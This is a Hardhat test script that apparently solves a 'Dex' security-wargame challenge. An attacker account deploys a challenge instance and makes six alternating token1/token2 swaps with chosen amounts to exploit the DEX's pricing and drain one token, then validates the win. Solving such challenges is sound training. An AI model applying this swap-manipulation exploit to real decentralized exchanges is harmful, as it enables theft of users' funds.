import { TransactionResponse } from "@ethersproject/providers";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Dex Hack", async () => {
  let tx: TransactionResponse;
  async function deployDexFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const attackerAddress = await attacker.getAddress();
    const DexFactory = await ethers.getContractFactory("DexFactory");
    const factory = await DexFactory.connect(deployer).deploy();
    await factory.deployed();

    // We cannot get the return value of the state-changing function off-chain.
    // Simulate on-chain execution of the createInstance() to get the return value (the address of the deployed instance).
    const dexAddress = await factory.connect(attacker).callStatic.createInstance(attackerAddress);

    // deploy the instance
    tx = await factory.connect(attacker).createInstance(attackerAddress);
    await tx.wait(1);

    const dex = await ethers.getContractAt("Dex", dexAddress);

    const tokenOneAddress = await dex.token1();
    const tokenOne = await ethers.getContractAt("SwappableToken", tokenOneAddress);

    const tokenTwoAddress = await dex.token2();
    const tokenTwo = await ethers.getContractAt("SwappableToken", tokenTwoAddress);

    return { attacker, factory, dex, tokenOne, tokenTwo };
  }

  it("Should drain Token1 or Token2 from Dex contract", async () => {
    const { attacker, factory, dex, tokenOne, tokenTwo } = await loadFixture(deployDexFixture);
    const attackerAddress = await attacker.getAddress();
    const tokenOneAddress = tokenOne.address;
    const tokenTwoAddress = tokenTwo.address;

    tx = await dex.connect(attacker).approve(dex.address, 500);
    await tx.wait(1);

    tx = await dex.connect(attacker).swap(tokenOneAddress, tokenTwoAddress, 10);
    await tx.wait(1);

    tx = await dex.connect(attacker).swap(tokenTwoAddress, tokenOneAddress, 20);
    await tx.wait(1);

    tx = await dex.connect(attacker).swap(tokenOneAddress, tokenTwoAddress, 24);
    await tx.wait(1);

    tx = await dex.connect(attacker).swap(tokenTwoAddress, tokenOneAddress, 30);
    await tx.wait(1);

    tx = await dex.connect(attacker).swap(tokenOneAddress, tokenTwoAddress, 41);
    await tx.wait(1);

    tx = await dex.connect(attacker).swap(tokenTwoAddress, tokenOneAddress, 45);
    await tx.wait(1);

    console.log(
      "-------------------",
      await tokenOne.balanceOf(dex.address),
      "__",
      await tokenTwo.balanceOf(dex.address)
    );
    const success = await factory.connect(attacker).validateInstance(dex.address, attackerAddress);
    expect(success).to.be.equal(true, "Failed To Validate The Instance!!!");
  });
});
